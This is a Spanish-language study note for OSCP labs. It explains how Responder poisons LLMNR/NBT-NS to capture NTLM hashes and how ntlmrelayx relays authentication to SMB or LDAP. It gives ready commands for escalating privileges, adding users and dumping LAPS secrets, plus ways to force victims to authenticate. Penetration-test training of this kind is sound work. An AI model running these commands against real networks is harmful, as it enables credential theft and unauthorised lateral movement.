Aunque en OSCP estándar su uso está limitado, en labs o entornos más realistas `Responder` y `ntlmrelayx` son herramientas críticas para escalar privilegios y moverse lateralmente mediante ataques de tipo relay o captura de hashes NTLM.

---

## 1. `Responder`

### ¿Qué es?
Herramienta que envenena peticiones LLMNR, NBT-NS y MDNS para capturar hashes NTLMv1/v2 cuando otros sistemas intentan resolver nombres en la red local.

### Uso básico:
```bash
sudo responder -I <interfaz>
```

Ejemplo:
```bash
sudo responder -I tun0
```

Captura automáticamente hashes NTLM que luego puedes crackear con `john` o `hashcat`.

---

## Configuración recomendada
Edita `Responder.conf` para desactivar SMB y evitar interferencias si vas a usar `ntlmrelayx`:
```ini
SMB = Off
HTTP = On
HTTPS = On
...
```

---

## 2. `ntlmrelayx.py` (impacket)

### ¿Qué es?
Herramienta que intercepta y reenvía autenticaciones NTLM para acceder a otros recursos en nombre de la víctima (relay).

### Requisitos:
- El objetivo debe autenticar contra ti (con ayuda de `Responder` u otro trigger)
- Tener un recurso escuchando (como SMB o HTTP)
- El destino donde relays apuntan debe aceptar NTLM

### Relay a SMB con ejecución remota:
```bash
sudo ntlmrelayx.py -t smb://192.168.100.10 -smb2support --escalate-user
```

### Relay a LDAP con creación de usuario:
```bash
sudo ntlmrelayx.py -t ldap://192.168.100.10 --add-user
```

Puedes usar `--dump-user`, `--dump-laps`, `--add-computer`, `--shadow-credentials`, etc. según permisos.

---

## Trigger del ataque
Lanza algo que fuerce autenticación, como:
- Abrir UNC path desde máquina víctima (`\\KALI_IP\SHARE`)
- Ejecutar scripts que acceden a rutas compartidas
- Aprovechar servicios como `printer bug`, `wsus`, etc.

---

## Casos de Uso OSCP

- Captura de hashes para cracking (Responder)
- Ejecución remota tras relay exitoso (ntlmrelayx)
- Lateral movement con usuarios privilegiados

---

## Buenas prácticas

- Usa en redes activas con tráfico o fuerza interacción
- No mantengas responder activo por defecto en OSCP (puede interferir)
- Filtra tráfico capturado y apunta solo a víctimas específicas cuando uses relay

---
